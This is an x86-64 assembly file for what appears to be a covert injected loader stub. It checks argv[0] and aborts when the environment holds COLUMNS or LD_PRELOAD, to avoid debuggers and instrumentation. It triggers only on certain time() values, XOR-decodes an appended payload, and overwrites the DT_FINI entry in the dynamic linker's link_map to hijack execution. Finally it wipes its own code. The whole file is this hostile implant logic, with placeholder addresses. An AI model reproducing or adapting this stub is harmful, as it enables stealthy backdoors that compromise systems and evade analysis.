.equ PAYLOAD_SIZE_IN_WORDS, 0
.equ ADDR_TO_WRITE, 0x1111111111111111
.equ VALUE_TO_WRITE, 0x2222222222222222

.macro movqq a, b
    push \b
    pop \a
.endm

_begin:
    push rbx
    lea rbx, [rip+_begin-8]
    mov rdi, [rbx] /* &_dl_argv */

    // Make sure argv[0] starts with '/' (which is unusual when debugging, but plausible with xinetd)
    mov rcx, [rdi]
    jrcxz bye
    cmp byte ptr [rcx], '/'
    jnz bye

    /* Optimized (for size) loop for skipping argv */
    /* No need to populate rcx: it is guaranteed to have a pointer now */
    xor eax, eax
    repnz scasq

    // Check for environment variable "LINES", "COLUMNS", "LD_PRELOAD" and "LD_AUDIT".
    // To make it tight we use an approximation: just check the first 4 characters.
env_check_loop:
    mov rcx, [rdi]
    scasq
    jrcxz env_check_okay
    mov eax, dword ptr [rcx]
    ror eax, 1
    cmp eax, 0xaaa627a1 /* "COLU" */
    jz bye
    // hex(ror(u32(b"LD_P"), 1, 32) & 0xffff). there might be false positive but
    // we don't care as long as there aren't in prod.
    cmp ax, 0xa226
    jz bye
    jmp env_check_loop

env_check_okay:
    /* Patch payload to only run at correct time. rdi points to auxv (writable) */
    xor edi, edi
    call [rbx-8]
    /* Decode payload only when time() % 64 == 0 */
    test al, 63
    movqq rcx, PAYLOAD_SIZE_IN_WORDS
    movabs r11, VALUE_TO_WRITE
    // lea rdi, [rbx+(_end-_begin)+8]
    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8
    jnz bye
    imul eax, eax, 119
    stosd
    // Decode payload
    xor eax, eax
decode_loop:
    xor [rdi+rcx*4], eax
    jz bye
    add eax, [rdi+rcx*4]
    loop decode_loop

    // Overwrite dl_info[DT_FINI] in link_map
    movabs r10, ADDR_TO_WRITE
    mov [r10], r11

bye:
    // Zeroing self
    movqq rdi, rbx
    // GNU AS (2.40) is too stupid: it assembles "push (_fin-_begin+8)" into a 0x68 (4 byte push) instead of single byte one.
    .byte 0x6A
    .byte (_end-8-_begin+8)
    pop rcx
    xor eax, eax
    pop rbx
    rep stosb
    _fin:
    ret
_end:
